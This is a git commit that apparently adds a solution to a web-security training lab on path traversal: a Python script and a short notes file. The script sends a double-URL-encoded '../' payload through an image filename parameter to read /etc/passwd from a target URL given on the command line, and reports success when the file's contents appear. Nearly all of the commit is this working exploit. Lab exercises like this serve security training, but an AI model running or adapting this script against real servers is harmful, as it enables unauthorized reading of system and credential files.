10dc50017d3149ae7f87f478ceeda2e4561d9ce4
Rana Khalil <ranakhalil101@gmail.com>
2023-01-08 19:48:22 -0500

    Add files via upload

---
+++ directory-traversal/lab-04/directory-traversal-lab-04.py
@@ -0,0 +1,32 @@
+import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def directory_traversal_exploit(url):
+    image_url = url + '/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'
+
+    r = requests.get(image_url, verify=False, proxies=proxies)
+    if 'root:x' in r.text:
+        print('(+) Exploit successful!')
+        print('(+) The following is the content of the /etc/passwd file:')
+        print(r.text)
+    else:
+        print('(-) Exploit failed.')
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+    
+    url = sys.argv[1]
+    print("(+) Exploiting the directory traversal vulnerability...")
+    directory_traversal_exploit(url)
+
+if __name__ == "__main__":
+    main()
---
+++ directory-traversal/lab-04/notes.txt
@@ -0,0 +1,7 @@
+Lab #4 - File path traversal, traversal sequences stripped with superfluous URL-decode
+
+Target Goal - Retrieve the contents of the /etc/passwd file.
+
+Analysis:
+
+../
